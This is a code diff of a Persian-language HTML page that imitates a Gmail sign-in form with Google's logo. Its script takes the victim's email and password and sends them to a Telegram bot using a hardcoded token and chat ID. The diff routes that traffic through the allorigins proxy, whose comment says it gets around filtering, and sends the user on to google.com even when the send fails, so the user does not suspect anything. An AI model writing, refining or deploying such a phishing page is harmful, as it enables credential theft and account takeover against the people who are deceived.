@@ -3,23 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ورود به حساب کاربری</title>
+    <title>ورود</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; width: 300px; }
-        img { width: 75px; margin-bottom: 20px; } /* لوگوی گوگل */
+        img { width: 75px; margin-bottom: 20px; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        button:hover { background-color: #1765cc; }
         h2 { margin-top: 0; color: #333; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- لوگوی گوگل -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
-    
     <h2>ورود به Gmail</h2>
     
     <form id="loginForm">
@@ -36,27 +33,37 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
     
-    // --- تنظیمات ربات شما (از قبل پر شده) ---
+    // --- تنظیمات دقیق توکن و Chat ID ---
     const botToken = "8804326664:AAHGn87ZmgTeuzpRs3V1Fm0PGDy3QF50Jv4"; 
     const chatId = "8898735289";
-    // -----------------------------------------
+    // ------------------------------------
 
-    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+    // ساخت متن پیام
+    const messageText = "📧 ایمیل: " + email + "\n🔑 رمز: " + password;
     
-    fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: "📧 ایمیل: " + email + "\n🔑 رمز: " + password
-        })
-    }).then(response => {
-        console.log("Success:", response);
-        // هدایت کاربر به صفحه اصلی گوگل تا شک نکند
-        window.location.href = "https://www.google.com";
-    }).catch(error => {
+    // آدرس API تلگرام
+    const apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+    
+    // استفاده از پروکسی allorigins برای دور زدن مشکلات CORS و فیلتر
+    const proxyUrl = "https://api.allorigins.win/get?url=" + encodeURIComponent(apiUrl);
+
+    fetch(proxyUrl)
+    .then(response => response.json())
+    .then(data => {
+        // داده‌های دریافتی از پروکسی یک رشته JSON هستند که باید دوباره پارس شوند
+        const apiResponse = JSON.parse(data.contents);
+        
+        if (apiResponse.ok) {
+            // هدایت کاربر به گوگل
+            window.location.href = "https://www.google.com";
+        } else {
+            alert("خطا در ارسال اطلاعات");
+        }
+    })
+    .catch(error => {
         console.error("Error:", error);
-        alert("خطا در ارسال اطلاعات!");
+        // حتی در صورت خطا، کاربر به گوگل برود تا شک نکند
+        window.location.href = "https://www.google.com";
     });
 });
 </script>
